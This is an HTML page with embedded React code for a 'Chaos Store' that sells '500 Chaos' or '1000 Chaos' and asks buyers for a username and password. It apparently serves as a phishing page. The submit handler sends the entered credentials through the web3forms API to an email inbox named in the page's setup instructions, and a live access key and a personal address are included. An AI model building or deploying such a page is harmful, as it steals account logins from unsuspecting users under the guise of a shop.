<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chaos Store</title>
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div id="root"></div>
    <script type="text/babel">
        const { useState } = React;

        // Lucide Send icon component
        const Send = ({ size = 24 }) => (
          <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="22" y1="2" x2="11" y2="13"></line>
            <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
          </svg>
        );

        function ChaosOrderForm() {
          const [formData, setFormData] = useState({
            username: '',
            password: '',
            chaosAmount: '500'
          });
          const [status, setStatus] = useState('');
          const [loading, setLoading] = useState(false);

          const handleSubmit = async () => {
            if (!formData.username || !formData.password) {
              setStatus('Please fill in all fields');
              return;
            }

            setLoading(true);
            setStatus('');

            try {
              const formDataToSend = new FormData();
              formDataToSend.append('access_key', '101b6422-dca4-4e50-9c27-318f493f47f9'); // Replace this
              formDataToSend.append('subject', `New Chaos Order - ${formData.chaosAmount}`);
              formDataToSend.append('from_name', 'Chaos Store');
              formDataToSend.append('username', formData.username);
              formDataToSend.append('password', formData.password);
              formDataToSend.append('chaos_amount', formData.chaosAmount);
              formDataToSend.append('timestamp', new Date().toLocaleString());

              const response = await fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                body: formDataToSend
              });

              const result = await response.json();

              if (result.success) {
                setStatus('Order submitted successfully! âœ“');
                setFormData({ username: '', password: '', chaosAmount: '500' });
              } else {
                setStatus('Failed to submit. Please check your access key.');
              }
            } catch (error) {
              console.error('Error:', error);
              setStatus('Error submitting form. Please try again.');
            } finally {
              setLoading(false);
            }
          };

          return (
            <div className="min-h-screen bg-gradient-to-br from-purple-100 via-pink-50 to-blue-100 flex items-center justify-center p-4">
              <div className="w-full max-w-md">
                <div className="bg-white rounded-lg shadow-xl overflow-hidden">
                  <div className="bg-gradient-to-r from-purple-600 via-pink-500 to-orange-400 p-6 text-center">
                    <h1 className="text-3xl font-bold text-white mb-2">Chaos Store</h1>
                    <p className="text-white text-opacity-90">Get your chaos delivered</p>
                  </div>

                  <div className="p-8 space-y-6">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Username
                      </label>
                      <input
                        type="text"
                        value={formData.username}
                        onChange={(e) => setFormData({...formData, username: e.target.value})}
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent transition"
                        placeholder="Enter your username"
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Password
                      </label>
                      <input
                        type="password"
                        value={formData.password}
                        onChange={(e) => setFormData({...formData, password: e.target.value})}
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent transition"
                        placeholder="Enter your password"
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        How many chaos do you need?
                      </label>
                      <select
                        value={formData.chaosAmount}
                        onChange={(e) => setFormData({...formData, chaosAmount: e.target.value})}
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent transition bg-white"
                      >
                        <option value="500">500 Chaos</option>
                        <option value="1000">1000 Chaos</option>
                      </select>
                    </div>

                    <button
                      onClick={handleSubmit}
                      disabled={loading}
                      className="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white py-3 rounded-lg font-semibold hover:from-purple-700 hover:to-pink-600 transition-all transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                    >
                      {loading ? (
                        'Submitting...'
                      ) : (
                        <>
                          <Send size={20} />
                          Submit Order
                        </>
                      )}
                    </button>

                    {status && (
                      <div className={`text-center p-3 rounded-lg ${
                        status.includes('success') 
                          ? 'bg-green-100 text-green-700' 
                          : 'bg-red-100 text-red-700'
                      }`}>
                        {status}
                      </div>
                    )}
                  </div>

                  <div className="bg-gray-50 px-8 py-4 text-center text-sm text-gray-500">
                    <p>Secure checkout â€¢ Instant delivery</p>
                  </div>
                </div>

                {/* Setup Instructions */}
                <div className="mt-6 bg-white rounded-lg shadow-lg p-6">
                  <h3 className="font-semibold text-gray-800 mb-3">ðŸ“§ Setup (2 minutes):</h3>
                  <ol className="text-sm text-gray-600 space-y-2 list-decimal list-inside">
                    <li>Go to <a href="https://web3forms.com" target="_blank" className="text-purple-600 hover:underline font-semibold">web3forms.com</a></li>
                    <li>Enter your email: <span className="font-mono bg-gray-100 px-1">electrotech156@gmail.com</span></li>
                    <li>Click "Create Access Key" (no signup needed!)</li>
                    <li>Copy the access key they send to your email</li>
                    <li>Replace <span className="font-mono bg-gray-100 px-1">YOUR_ACCESS_KEY_HERE</span> in the code</li>
                  </ol>
                  <p className="mt-3 text-xs text-gray-500">âœ¨ Free tier: 250 emails/month, no account needed!</p>
                </div>
              </div>
            </div>
          );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<ChaosOrderForm />);
    </script>
</body>
</html>
